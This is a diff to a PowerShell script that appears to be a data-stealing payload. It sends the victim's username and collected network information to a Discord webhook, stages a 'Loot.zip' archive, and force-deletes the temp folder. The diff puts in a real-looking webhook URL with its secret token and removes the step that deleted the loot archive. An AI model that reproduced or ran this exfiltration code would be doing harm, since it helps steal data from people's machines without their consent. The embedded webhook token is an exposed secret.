@@ -48,7 +48,7 @@ param (
     [string]$text 
 )
 
-$hookurl = 'YOUR-DISCORD-WEBHOOK'
+$hookurl = 'https://discord.com/api/webhooks/1046395262442160229/TTFG2wyCR_mMAzjXy1o7EAzGalnxpktdDSnk0DXMp-sbVRLG9cqj4DVvnH7Yyq1kl1L2'
 
 $Body = @{
   'username' = $env:username
@@ -67,9 +67,6 @@ Upload-Discord -text $Networks
 
 #delay
 Start-Sleep -Seconds 3
-
-#delete created archive
-Remove-Item -Path $env:USERPROFILE"\Desktop\Loot.zip"
 
 #temp folder
 rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue
